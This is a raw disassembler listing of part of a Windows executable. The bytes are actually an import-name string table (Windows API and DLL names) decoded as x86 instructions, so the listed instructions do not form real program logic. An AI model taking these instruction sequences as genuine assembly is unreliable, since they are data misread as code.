  412cfd:	gs jae 0x412d6f
  412d00:	jne    0x412d74
  412d02:	arpl   WORD PTR [ebp+0x57],sp
  412d05:	add    BYTE PTR [edx+0x63655201],bh
  412d0b:	je     0x412d63
  412d0d:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  412d14:	pop    edi
  412d15:	add    DWORD PTR [edi+0x65],eax
  412d18:	je     0x412d67
  412d1a:	popa   
  412d1b:	jo     0x412d6a
  412d1d:	outs   dx,DWORD PTR ds:[esi]
  412d1e:	fs add BYTE PTR gs:[eax],al
  412d22:	push   es
  412d23:	add    dl,BYTE PTR [ebx+0x74]
  412d26:	jb     0x412d8d
  412d28:	je     0x412d8d
  412d2a:	push   0x746c42
  412d2f:	add    BYTE PTR [esi+0x1],ah
  412d32:	inc    edi
  412d33:	gs je  0x412d84
  412d36:	gs popa 
  412d38:	jb     0x412d9f
  412d3a:	jae    0x412db0
  412d3c:	push   eax
  412d3d:	popa   
  412d3e:	ins    BYTE PTR es:[edi],dx
  412d3f:	gs je  0x412db6
  412d42:	gs dec ecx
  412d44:	outs   dx,BYTE PTR ds:[esi]
  412d45:	fs gs js 0x412d49
  412d49:	add    dh,bl
  412d4b:	add    DWORD PTR [ebx+0x65],edx
  412d4e:	je     0x412d94
  412d50:	dec    ecx
  412d51:	inc    edx
  412d52:	imul   esi,DWORD PTR [ebx+esi*2+0x54],0x7665446f
  412d5a:	imul   esp,DWORD PTR [ebx+0x65],0x47015c00
  412d61:	gs je  0x412db0
  412d64:	popa   
  412d65:	jns    0x412dd6
  412d67:	jne    0x412ddd
  412d69:	add    dl,bh
  412d6b:	add    DWORD PTR [ebx+0x65],edx
  412d6e:	je     0x412dc4
  412d70:	gs js  0x412de7
  412d73:	inc    ebx
  412d74:	outs   dx,DWORD PTR ds:[esi]
  412d75:	ins    BYTE PTR es:[edi],dx
  412d76:	outs   dx,DWORD PTR ds:[esi]
  412d77:	jb     0x412d79
  412d79:	add    BYTE PTR [esi+0x65724300],dl
  412d7f:	popa   
  412d80:	je     0x412de7
  412d82:	inc    ebp
  412d83:	ins    BYTE PTR es:[edi],dx
  412d84:	ins    BYTE PTR es:[edi],dx
  412d85:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  412d8c:	outs   dx,BYTE PTR ds:[esi]
  412d8d:	dec    ecx
  412d8e:	outs   dx,BYTE PTR ds:[esi]
  412d8f:	imul   esi,DWORD PTR fs:[edx+0x65],0x7f007463
  412d97:	add    DWORD PTR [edi+0x65],eax
  412d9a:	je     0x412df0
  412d9c:	gs js  0x412e13
  412d9f:	inc    ebx
  412da0:	outs   dx,DWORD PTR ds:[esi]
  412da1:	ins    BYTE PTR es:[edi],dx
  412da2:	outs   dx,DWORD PTR ds:[esi]
  412da3:	jb     0x412da5
  412da5:	add    BYTE PTR [ecx+0x74654701],cl
  412dab:	push   esp
  412dac:	gs js  0x412e23
  412daf:	inc    esi
  412db0:	popa   
  412db1:	arpl   WORD PTR [ebp+0x57],sp
  412db4:	add    BYTE PTR [eax],al
  412db6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412db7:	add    BYTE PTR [ebx+0x72],al
  412dba:	gs popa 
  412dbc:	je     0x412e23
  412dbe:	push   eax
  412dbf:	popa   
  412dc0:	ins    BYTE PTR es:[edi],dx
  412dc1:	gs je  0x412e38
  412dc4:	gs add bh,ch
  412dc7:	add    DWORD PTR [ebx+0x65],edx
  412dca:	je     0x412e1c
  412dcc:	imul   edi,DWORD PTR [eax+0x65],0xd000006c
  412dd3:	add    DWORD PTR [ebx+0x65],edx
  412dd6:	je     0x412e19
  412dd8:	bound  ebp,QWORD PTR [edi+0x72]
  412ddb:	je     0x412e2d
  412ddd:	jb     0x412e4e
  412ddf:	arpl   WORD PTR [eax],ax
  412de1:	add    dh,cl
  412de3:	add    BYTE PTR [ebp+0x78],al
  412de6:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  412dea:	gs inc ebx
  412dec:	ins    BYTE PTR es:[edi],dx
  412ded:	imul   esi,DWORD PTR [eax+0x52],0x746365
  412df4:	mov    esp,0x6c6c4500
  412df9:	imul   esi,DWORD PTR [eax+0x73],0x1c40065
  412e00:	push   edx
  412e01:	gs jae 0x412e6d
  412e04:	jp     0x412e6b
  412e06:	push   eax
  412e07:	popa   
  412e08:	ins    BYTE PTR es:[edi],dx
  412e09:	gs je  0x412e80
  412e0c:	gs add ah,cl
  412e0f:	add    DWORD PTR [ebx+0x65],edx
  412e12:	ins    BYTE PTR es:[edi],dx
  412e13:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  412e18:	imul   esi,DWORD PTR [eax+0x52],0xb3006e67
  412e1f:	add    DWORD PTR [eax+0x6f],edx
  412e22:	ins    BYTE PTR es:[edi],dx
  412e23:	jns    0x412e8c
  412e25:	outs   dx,DWORD PTR ds:[esi]
  412e26:	outs   dx,BYTE PTR ds:[esi]
  412e27:	add    BYTE PTR [edi+0x65724300],bl
  412e2d:	popa   
  412e2e:	je     0x412e95
  412e30:	dec    eax
  412e31:	popa   
  412e32:	ins    BYTE PTR es:[edi],dx
  412e33:	data16 je 0x412ea5
  412e36:	outs   dx,BYTE PTR ds:[esi]
  412e37:	gs push eax
  412e39:	popa   
  412e3a:	ins    BYTE PTR es:[edi],dx
  412e3b:	gs je  0x412eb2
  412e3e:	add    BYTE PTR gs:[edi+0x44],al
  412e42:	dec    ecx
  412e43:	xor    esi,DWORD PTR [edx]
  412e45:	cs fs ins BYTE PTR es:[edi],dx
  412e48:	ins    BYTE PTR es:[edi],dx
  412e49:	add    BYTE PTR [eax+eax*1+0x50],al
  412e4d:	popa   
  412e4e:	je     0x412eb8
  412e50:	inc    esi
  412e51:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x74736978
  412e59:	jae    0x412e9c
  412e5b:	add    BYTE PTR [ebx+0x48],dl
  412e5e:	dec    esp
  412e5f:	push   edi
  412e60:	inc    ecx
  412e61:	push   eax
  412e62:	dec    ecx
  412e63:	cs fs ins BYTE PTR es:[edi],dx
  412e66:	ins    BYTE PTR es:[edi],dx
  412e67:	add    BYTE PTR [eax+0x1],dl
  412e6a:	inc    esi
  412e6b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x54656d69
  412e73:	outs   dx,DWORD PTR ds:[esi]
  412e74:	push   ebx
  412e75:	jns    0x412eea
  412e77:	je     0x412ede
  412e79:	ins    DWORD PTR es:[edi],dx
  412e7a:	push   esp
  412e7b:	imul   ebp,DWORD PTR [ebp+0x65],0x33a0000
  412e82:	dec    edi
  412e83:	jo     0x412eea
  412e85:	outs   dx,BYTE PTR ds:[esi]
  412e86:	inc    esi
  412e87:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x5303db00
  412e8f:	gs popa 
  412e91:	jb     0x412ef6
  412e93:	push   0x68746150
  412e98:	inc    ecx
  412e99:	add    BYTE PTR [ecx],al
  412e9b:	add    DWORD PTR [ebp+eiz*2+0x6c],eax
  412e9f:	gs je  0x412f07
  412ea2:	inc    ebx
  412ea3:	jb     0x412f0e
  412ea5:	je     0x412f10
  412ea7:	arpl   WORD PTR [ecx+0x6c],sp
  412eaa:	push   ebx
  412eab:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  412eb0:	outs   dx,BYTE PTR ds:[esi]
  412eb1:	add    BYTE PTR [esi],bl
  412eb3:	add    al,BYTE PTR [edi+0x65]
  412eb6:	je     0x412f08
  412eb8:	jb     0x412f23
  412eba:	outs   dx,DWORD PTR ds:[esi]
  412ebb:	jb     0x412f26
  412ebd:	je     0x412f38
  412ebf:	inc    ebx
  412ec0:	ins    BYTE PTR es:[edi],dx
  412ec1:	popa   
  412ec2:	jae    0x412f37
  412ec4:	add    BYTE PTR [eax],al
  412ec6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ec7:	add    BYTE PTR [ebx+0x61],al
  412eca:	outs   dx,BYTE PTR ds:[esi]
  412ecb:	arpl   WORD PTR [ebp+0x6c],sp
  412ece:	push   edi
  412ecf:	popa   
  412ed0:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  412ed8:	ins    DWORD PTR es:[edi],dx
  412ed9:	gs jb  0x412edc
  412edc:	dec    ebp
  412edd:	add    eax,0x7274736c
  412ee2:	ins    BYTE PTR es:[edi],dx
  412ee3:	outs   dx,BYTE PTR gs:[esi]
  412ee5:	inc    ecx
  412ee6:	add    BYTE PTR [eax],al
  412ee8:	mov    WORD PTR [ecx],es
  412eea:	inc    edi
  412eeb:	gs je  0x412f2f
  412eee:	je     0x412f5f
  412ef0:	ins    DWORD PTR es:[edi],dx
  412ef1:	dec    esi
  412ef2:	popa   
  412ef3:	ins    DWORD PTR es:[edi],dx
  412ef4:	gs push edi
  412ef6:	add    BYTE PTR [eax],al
  412ef8:	xor    eax,0x74655304
  412efd:	push   esp
  412efe:	push   0x64616572
  412f03:	inc    ecx
  412f04:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  412f0b:	dec    ebp
  412f0c:	popa   
  412f0d:	jae    0x412f7a
  412f0f:	add    BYTE PTR [ecx+0x6f6c4702],cl
  412f15:	bound  esp,QWORD PTR [ecx+0x6c]
  412f18:	inc    ecx
  412f19:	ins    BYTE PTR es:[edi],dx
  412f1a:	ins    BYTE PTR es:[edi],dx
  412f1b:	outs   dx,DWORD PTR ds:[esi]
  412f1c:	arpl   WORD PTR [eax],ax
  412f1e:	sbb    eax,0x74655304
  412f23:	dec    eax
  412f24:	popa   
  412f25:	outs   dx,BYTE PTR ds:[esi]
  412f26:	fs ins BYTE PTR es:[edi],dx
  412f28:	gs inc ebx
  412f2a:	outs   dx,DWORD PTR ds:[esi]
  412f2b:	jne    0x412f9b
  412f2d:	je     0x412f2f
  412f2f:	add    BYTE PTR [edx+0x2],ah
  412f32:	inc    edi
  412f33:	gs je  0x412f8a
  412f36:	gs ins DWORD PTR es:[edi],dx
  412f38:	jo     0x412f8a
  412f3a:	popa   
  412f3b:	je     0x412fa5
  412f3d:	push   edi
  412f3e:	add    BYTE PTR [eax],al
  412f40:	xchg   edx,eax
  412f41:	add    al,BYTE PTR [edi+0x6c]
  412f44:	outs   dx,DWORD PTR ds:[esi]
  412f45:	bound  esp,QWORD PTR [ecx+0x6c]
  412f48:	inc    edi
  412f49:	gs je  0x412f8d
  412f4c:	je     0x412fbd
  412f4e:	ins    DWORD PTR es:[edi],dx
  412f4f:	dec    esi
  412f50:	popa   
  412f51:	ins    DWORD PTR es:[edi],dx
  412f52:	gs push edi
  412f54:	add    BYTE PTR [eax],al
  412f56:	retf   0x4300
  412f59:	jb     0x412fc0
  412f5b:	popa   
  412f5c:	je     0x412fc3
  412f5e:	inc    ebp
  412f5f:	jbe    0x412fc6
  412f61:	outs   dx,BYTE PTR ds:[esi]
  412f62:	je     0x412fa5
  412f64:	add    BYTE PTR [eax],al
  412f66:	dec    edi
  412f67:	add    al,0x53
  412f69:	jne    0x412fde
  412f6b:	jo     0x412fd2
  412f6d:	outs   dx,BYTE PTR ds:[esi]
  412f6e:	fs push esp
  412f70:	push   0x64616572
  412f75:	add    BYTE PTR [ebx+0x2],ah
  412f78:	inc    edi
  412f79:	gs je  0x412fd0
  412f7c:	push   0x64616572
  412f81:	inc    ebx
  412f82:	outs   dx,DWORD PTR ds:[esi]
  412f83:	outs   dx,BYTE PTR ds:[esi]
  412f84:	je     0x412feb
  412f86:	js     0x412ffc
  412f88:	add    BYTE PTR [eax],al
  412f8a:	ret    
  412f8b:	add    al,0x6c
  412f8d:	jae    0x413003
  412f8f:	jb     0x412ff4
  412f91:	ins    DWORD PTR es:[edi],dx
  412f92:	jo     0x412feb
  412f94:	add    BYTE PTR [eax],al
  412f96:	retf   
  412f97:	add    cl,BYTE PTR [ecx+0x73]
  412f9a:	inc    edx
  412f9b:	popa   
  412f9c:	fs push edx
  412f9e:	gs popa 
  412fa0:	fs push eax
  412fa2:	je     0x413016
  412fa4:	add    BYTE PTR [eax],al
  412fa6:	int3   
  412fa7:	add    al,0x6c
  412fa9:	jae    0x41301f
  412fab:	jb     0x413010
  412fad:	jo     0x413028
  412faf:	outs   dx,BYTE PTR ds:[esi]
  412fb0:	push   edi
  412fb1:	add    dh,ah
  412fb3:	add    BYTE PTR [ebx+0x72],al
  412fb6:	gs popa 
  412fb8:	je     0x41301f
  412fba:	push   edx
  412fbb:	gs ins DWORD PTR es:[edi],dx
  412fbd:	outs   dx,DWORD PTR ds:[esi]
  412fbe:	je     0x413025
  412fc0:	push   esp
  412fc1:	push   0x64616572
  412fc6:	add    BYTE PTR [eax],al
  412fc8:	retf   
  412fc9:	add    DWORD PTR [edi+0x65],eax
  412fcc:	je     0x413011
  412fce:	jne    0x413042
  412fd0:	jb     0x413037
  412fd2:	outs   dx,BYTE PTR ds:[esi]
  412fd3:	je     0x413019
  412fd5:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  412fdc:	jns    0x413035
  412fde:	add    BYTE PTR [eax],al
  412fe0:	inc    edx
  412fe1:	add    al,BYTE PTR [edi+0x65]
  412fe4:	je     0x413039
  412fe6:	push   0x5074726f
  412feb:	popa   
  412fec:	je     0x413056
  412fee:	dec    esi
  412fef:	popa   
  412ff0:	ins    DWORD PTR es:[edi],dx
  412ff1:	gs inc ecx
  412ff3:	add    al,dl
  412ff5:	add    BYTE PTR [ebx+0x72],al
  412ff8:	gs popa 
  412ffa:	je     0x413061
  412ffc:	inc    esi
  412ffd:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x45012000
  413005:	outs   dx,BYTE PTR ds:[esi]
  413006:	jne    0x413075
  413008:	push   edx
  413009:	gs jae 0x41307b
  41300c:	jne    0x413080
  41300e:	arpl   WORD PTR [ebp+0x4e],sp
  413011:	popa   
  413012:	ins    DWORD PTR es:[edi],dx
  413013:	gs jae 0x413057
  413016:	add    BYTE PTR [eax],al
  413018:	or     DWORD PTR [edx],eax
  41301a:	inc    edi
  41301b:	gs je  0x41306b
  41301e:	outs   dx,DWORD PTR ds:[esi]
  41301f:	fs jne 0x41308e
  413022:	gs inc esi
  413024:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41302c:	add    BYTE PTR [eax],al
  41302e:	ret    
  41302f:	add    edx,DWORD PTR [edx+0x74]
  413032:	ins    BYTE PTR es:[edi],dx
  413033:	push   ebp
  413034:	outs   dx,BYTE PTR ds:[esi]
  413035:	ja     0x4130a0
  413037:	outs   dx,BYTE PTR ds:[esi]
  413038:	add    BYTE PTR fs:[ebx],cl
  41303b:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  41303f:	popa   
  413040:	ins    BYTE PTR es:[edi],dx
  413041:	inc    ecx
  413042:	ins    BYTE PTR es:[edi],dx
  413043:	ins    BYTE PTR es:[edi],dx
  413044:	outs   dx,DWORD PTR ds:[esi]
  413045:	arpl   WORD PTR [eax],ax
  413047:	add    BYTE PTR [esp+eax*1+0x456e6957],dl
  41304e:	js     0x4130b5
  413050:	arpl   WORD PTR [eax],ax
  413052:	or     al,BYTE PTR [edx]
  413054:	inc    edi
  413055:	gs je  0x4130a5
  413058:	outs   dx,DWORD PTR ds:[esi]
  413059:	fs jne 0x4130c8
  41305c:	gs dec eax
  41305e:	popa   
  41305f:	outs   dx,BYTE PTR ds:[esi]
  413060:	fs ins BYTE PTR es:[edi],dx
  413062:	gs inc ecx
  413064:	add    BYTE PTR [eax],al
  413066:	sti    
  413067:	add    DWORD PTR [edi+0x65],eax
  41306a:	je     0x4130b8
  41306c:	popa   
  41306d:	jae    0x4130e3
  41306f:	inc    ebp
  413070:	jb     0x4130e4
  413072:	outs   dx,DWORD PTR ds:[esi]
  413073:	jb     0x413075
  413075:	add    BYTE PTR [edi+0x74654701],bl
  41307b:	inc    ebx
  41307c:	outs   dx,DWORD PTR ds:[esi]
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	jo     0x4130f5
  413080:	je     0x4130e7
  413082:	jb     0x4130d2
  413084:	popa   
  413085:	ins    DWORD PTR es:[edi],dx
  413086:	gs inc ecx
  413088:	add    BYTE PTR [eax],al
  41308a:	add    al,BYTE PTR [bx+0x65]
  41308e:	je     0x4130e4
  413090:	push   0x64616572
  413095:	dec    esp
  413096:	outs   dx,DWORD PTR ds:[esi]
  413097:	arpl   WORD PTR [ecx+0x6c],sp
  41309a:	gs add bl,dh
  41309d:	add    DWORD PTR [edi+0x65],eax
  4130a0:	je     0x4130e8
  4130a2:	jne    0x413110
  4130a4:	ins    BYTE PTR es:[edi],dx
  4130a5:	push   eax
  4130a6:	popa   
  4130a7:	je     0x413111
  4130a9:	dec    esi
  4130aa:	popa   
  4130ab:	ins    DWORD PTR es:[edi],dx
  4130ac:	gs push edi
  4130ae:	add    BYTE PTR [eax],al
  4130b0:	mov    ah,0x3
  4130b2:	push   edx
  4130b3:	gs ins DWORD PTR es:[edi],dx
  4130b5:	outs   dx,DWORD PTR ds:[esi]
  4130b6:	jbe    0x41311d
  4130b8:	inc    esp
  4130b9:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4130c0:	jns    0x413119
  4130c2:	add    BYTE PTR [eax],al
  4130c4:	and    al,0x3
  4130c6:	dec    ebp
  4130c7:	popa   
  4130c8:	jo     0x413120
  4130ca:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  4130d1:	ins    BYTE PTR es:[edi],dx
  4130d2:	add    BYTE PTR gs:[eax+0x4],al
  4130d6:	push   ebx
  4130d7:	gs je  0x41312e
  4130da:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4130e1:	jne    0x413148
  4130e3:	push   esp
  4130e4:	imul   ebp,DWORD PTR [ebp+0x65],0xf7000072
  4130eb:	add    DWORD PTR [edi+0x65],eax
  4130ee:	je     0x413138
  4130f0:	popa   
  4130f1:	outs   dx,BYTE PTR ds:[esi]
  4130f2:	fs ins BYTE PTR es:[edi],dx
  4130f4:	gs dec ecx
  4130f6:	outs   dx,BYTE PTR ds:[esi]
  4130f7:	outs   dx,WORD PTR ds:[esi]
  4130f9:	jb     0x413168
  4130fb:	popa   
  4130fc:	je     0x413167
  4130fe:	outs   dx,DWORD PTR ds:[esi]
  4130ff:	outs   dx,BYTE PTR ds:[esi]
  413100:	add    BYTE PTR [eax],al
  413102:	jmp    0x6946:0x74654701
  413109:	ins    BYTE PTR es:[edi],dx
  41310a:	gs inc ecx
  41310c:	je     0x413182
  41310e:	jb     0x413179
  413110:	bound  esi,QWORD PTR [ebp+0x74]
  413113:	gs jae 0x41315b
  413116:	js     0x413159
  413118:	add    BYTE PTR [eax],al
  41311a:	pop    ss
  41311b:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  41311f:	imul   eax,DWORD PTR [esi+0x69],0x6c
  413123:	add    BYTE PTR gs:[eax],al
  413126:	mov    BYTE PTR [eax],al
  413128:	inc    ecx
  413129:	jb     0x413190
  41312b:	inc    esi
  41312c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  413134:	dec    esi
  413135:	push   ebx
  413136:	dec    ecx
  413137:	add    BYTE PTR [esi+0x1],ch
  41313a:	inc    esi
  41313b:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  413142:	jne    0x4131b6
  413144:	arpl   WORD PTR [ebp+0x45],sp
  413147:	js     0x4131a0
  413149:	add    BYTE PTR [ecx+0x1],bl
  41314c:	inc    esi
  41314d:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  413154:	add    BYTE PTR gs:0x74655304,ah
  41315b:	dec    ebp
  41315c:	popa   
  41315d:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  413165:	outs   dx,WORD PTR ds:[esi]
  413167:	add    BYTE PTR [edx+0x65724601],al
  41316d:	gs dec esp
  41316f:	imul   esp,DWORD PTR [edx+0x72],0x797261
  413176:	js     0x41317b
  413178:	push   edx
  413179:	gs popa 
  41317b:	fs inc esi
  41317d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x53043c00
  413185:	gs je  0x4131dc
  413188:	push   0x64616572
  41318d:	push   eax
  41318e:	jb     0x4131f9
  413190:	outs   dx,DWORD PTR ds:[esi]
  413191:	jb     0x4131fc
  413193:	je     0x41320e
  413195:	add    BYTE PTR [ecx+0x2],ah
  413198:	inc    edi
  413199:	gs je  0x4131f0
  41319c:	gs ins DWORD PTR es:[edi],dx
  41319e:	jo     0x4131f0
  4131a0:	popa   
  4131a1:	je     0x41320b
  4131a3:	inc    ecx
  4131a4:	add    BYTE PTR [eax],al
  4131a6:	or     BYTE PTR [ecx],al
  4131a8:	inc    esp
  4131a9:	gs jbe 0x413215
  4131ac:	arpl   WORD PTR [ebp+0x49],sp
  4131af:	outs   dx,DWORD PTR ds:[esi]
  4131b0:	inc    ebx
  4131b1:	outs   dx,DWORD PTR ds:[esi]
  4131b2:	outs   dx,BYTE PTR ds:[esi]
  4131b3:	je     0x413227
  4131b5:	outs   dx,DWORD PTR ds:[esi]
  4131b6:	ins    BYTE PTR es:[edi],dx
  4131b7:	add    BYTE PTR [edi+0x1],cl
  4131ba:	inc    esi
  4131bb:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x54656d69
  4131c3:	outs   dx,DWORD PTR ds:[esi]
  4131c4:	dec    esp
  4131c5:	outs   dx,DWORD PTR ds:[esi]
  4131c6:	arpl   WORD PTR [ecx+0x6c],sp
  4131c9:	inc    esi
  4131ca:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  4131d2:	repnz add BYTE PTR [ebx+0x72],al
  4131d6:	gs popa 
  4131d8:	je     0x41323f
  4131da:	push   edi
  4131db:	popa   
  4131dc:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4131e4:	ins    DWORD PTR es:[edi],dx
  4131e5:	gs jb  0x413229
  4131e8:	add    BYTE PTR [eax],al
  4131ea:	jns    0x4131ee
  4131ec:	inc    edi
  4131ed:	gs je  0x413246
  4131f0:	gs jb  0x413266
  4131f3:	imul   ebp,DWORD PTR [edi+0x6e],0x454b0000
  4131fa:	push   edx
  4131fb:	dec    esi
  4131fc:	inc    ebp
  4131fd:	dec    esp
  4131fe:	xor    esi,DWORD PTR [edx]
  413200:	cs fs ins BYTE PTR es:[edi],dx
  413203:	ins    BYTE PTR es:[edi],dx
  413204:	add    BYTE PTR [eax],al
  413206:	cmp    al,0x0
  413208:	inc    ebx
  413209:	push   0x4d6b6365
  41320e:	outs   dx,BYTE PTR gs:[esi]
  413210:	jne    0x413264
  413212:	popa   
  413213:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  41321b:	add    BYTE PTR [edx+0x2],al
  41321e:	push   ebx
  41321f:	gs je  0x413268
  413222:	outs   dx,DWORD PTR ds:[esi]
  413223:	jb     0x41328a
  413225:	addr16 jb 0x413297
  413228:	jne    0x413298
  41322a:	fs push edi
  41322c:	imul   ebp,DWORD PTR [esi+0x64],0x5500776f
  413233:	add    DWORD PTR [edi+0x65],eax
  413236:	je     0x41328b
  413238:	arpl   WORD PTR [edx+0x6f],si
  41323b:	ins    BYTE PTR es:[edi],dx
  41323c:	ins    BYTE PTR es:[edi],dx
  41323d:	push   eax
  41323e:	outs   dx,DWORD PTR ds:[esi]
  41323f:	jae    0x413241
  413241:	add    ah,al
  413243:	add    DWORD PTR [ebp+0x61],ecx
  413246:	jo     0x41328c
  413248:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  41324f:	arpl   WORD PTR [eax+eax*1+0x24],si
  413253:	add    BYTE PTR [ebx+0x68],al
  413256:	popa   
  413257:	outs   dx,BYTE PTR ds:[esi]
  413258:	addr16 gs dec ebp
  41325b:	outs   dx,BYTE PTR gs:[esi]
  41325d:	jne    0x4132b6
  41325f:	add    cl,bh
  413261:	add    BYTE PTR [edi+0x65],al
  413264:	je     0x4132a9
  413266:	ins    BYTE PTR es:[edi],dx
  413267:	popa   
  413268:	jae    0x4132dd
  41326a:	dec    esp
  41326b:	outs   dx,DWORD PTR ds:[esi]
  41326c:	outs   dx,BYTE PTR ds:[esi]
  41326d:	addr16 push edi
  41326f:	add    bh,al
  413271:	add    DWORD PTR [ebp+0x61],ecx
  413274:	jo     0x4132cc
  413276:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  41327d:	gs jns 0x4132c5
  413280:	js     0x4132d9
  413282:	add    BYTE PTR [eax],al
  413284:	loop   0x413286
  413286:	inc    esi
  413287:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  41328e:	outs   dx,DWORD PTR ds:[esi]
  41328f:	ja     0x4132d6
  413291:	js     0x4132d4
  413293:	add    BYTE PTR [edi+0x73694400],bl
  413299:	jo     0x4132fc
  41329b:	je     0x413300
  41329d:	push   0x7373654d
  4132a2:	popa   
  4132a3:	addr16 gs inc ecx
  4132a6:	add    BYTE PTR [eax],al
  4132a8:	mov    es,WORD PTR [ecx]
  4132aa:	dec    ecx
  4132ab:	jae    0x4132f0
  4132ad:	push   0x6c417261
  4132b2:	jo     0x41331c
  4132b4:	popa   
  4132b5:	dec    esi
  4132b6:	jne    0x413325
  4132b8:	gs jb  0x413324
  4132bb:	arpl   WORD PTR [edi+0x0],dx
  4132be:	push   ecx
  4132bf:	add    BYTE PTR [ebx+0x72],al
  4132c2:	gs popa 
  4132c4:	je     0x41332b
  4132c6:	inc    ebx
  4132c7:	popa   
  4132c8:	jb     0x41332f
  4132ca:	je     0x4132cc
  4132cc:	mov    dl,0x0
  4132ce:	inc    esp
  4132cf:	jb     0x413332
  4132d1:	ja     0x413319
  4132d3:	jb     0x413336
  4132d5:	ins    DWORD PTR es:[edi],dx
  4132d6:	gs inc ebx
  4132d8:	outs   dx,DWORD PTR ds:[esi]
  4132d9:	outs   dx,BYTE PTR ds:[esi]
  4132da:	je     0x41334e
  4132dc:	outs   dx,DWORD PTR ds:[esi]
  4132dd:	ins    BYTE PTR es:[edi],dx
  4132de:	add    BYTE PTR [eax],al
  4132e0:	inc    esi
  4132e1:	add    BYTE PTR [ebx+0x6c],al
  4132e4:	outs   dx,DWORD PTR ds:[esi]
  4132e5:	jae    0x41334c
  4132e7:	inc    esp
  4132e8:	gs jae 0x413356
  4132eb:	je     0x41335c
  4132ed:	jo     0x4132ef
  4132ef:	add    BYTE PTR [ebp+0x61694400],bl
  4132f5:	ins    BYTE PTR es:[edi],dx
  4132f6:	outs   dx,DWORD PTR ds:[esi]
  4132f7:	addr16 inc edx
  4132f9:	outs   dx,DWORD PTR ds:[esi]
  4132fa:	js     0x41334c
  4132fc:	popa   
  4132fd:	jb     0x413360
  4132ff:	ins    DWORD PTR es:[edi],dx
  413300:	push   edi
  413301:	add    BYTE PTR [edx],cl
  413303:	add    BYTE PTR [ecx+0x72],al
  413306:	jb     0x413369
  413308:	outs   dx,BYTE PTR ds:[esi]
  413309:	addr16 gs dec ecx
  41330c:	arpl   WORD PTR [edi+0x6e],bp
  41330f:	imul   esp,DWORD PTR [ebx+0x57],0x6f646e69
  413316:	ja     0x41338b
  413318:	add    BYTE PTR [eax],al
  41331a:	fld    QWORD PTR [eax]
  41331c:	inc    ebp
  41331d:	jno    0x413394
  41331f:	popa   
  413320:	ins    BYTE PTR es:[edi],dx
  413321:	push   edx
  413322:	arpl   WORD PTR gs:[eax+eax*1-0x45],si
  413327:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41332b:	fs push ebx
  41332d:	je     0x4133a1
  41332f:	imul   ebp,DWORD PTR [esi+0x67],0x1ee0041
  413336:	push   eax
  413337:	gs imul ecx,DWORD PTR gs:[ebp+0x65],0x73
  41333d:	jae    0x4133a0
  41333f:	addr16 gs inc ecx
  413342:	add    BYTE PTR [eax],al
  413344:	cmp    DWORD PTR [eax],eax
  413346:	inc    ebx
  413347:	push   0x70557261
  41334c:	jo     0x4133b3
  41334e:	jb     0x4133a7
  413350:	add    BYTE PTR [eax],al
  413352:	adc    eax,DWORD PTR [ecx]
  413354:	inc    edi
  413355:	gs je  0x41339c
  413358:	outs   dx,DWORD PTR ds:[esi]
  413359:	jne    0x4133bd
  41335b:	ins    BYTE PTR es:[edi],dx
  41335c:	gs inc ebx
  41335e:	ins    BYTE PTR es:[edi],dx
  41335f:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  413366:	add    BYTE PTR [eax],al
  413368:	mov    ds:0x57734901,eax
  41336d:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  413374:	jae    0x4133df
  413376:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41337a:	mov    esp,0x61724400
  41337f:	ja     0x4133d5
  413381:	gs js  0x4133f8
  413384:	push   edi
  413385:	add    BYTE PTR [ebp+0x61724400],dh
  41338b:	ja     0x4133da
  41338d:	outs   dx,BYTE PTR gs:[esi]
  41338f:	jne    0x4133d3
  413391:	popa   
  413392:	jb     0x413394
  413394:	jle    0x413397
  413396:	dec    eax
  413397:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  41339f:	jne    0x4133ea
  4133a1:	je     0x413408
  4133a3:	ins    DWORD PTR es:[edi],dx
  4133a4:	add    BYTE PTR [eax],al
  4133a6:	mov    al,BYTE PTR [edx]
  4133a8:	push   esp
  4133a9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  4133b1:	ja     0x413426
  4133b3:	add    BYTE PTR [eax],ch
  4133b5:	add    BYTE PTR [ebx+0x68],al
  4133b8:	popa   
  4133b9:	jb     0x413407
  4133bb:	outs   dx,DWORD PTR ds:[esi]
  4133bc:	ja     0x413423
  4133be:	jb     0x413402
  4133c0:	jne    0x413428
  4133c2:	push   di
  4133c4:	add    BYTE PTR [eax],al
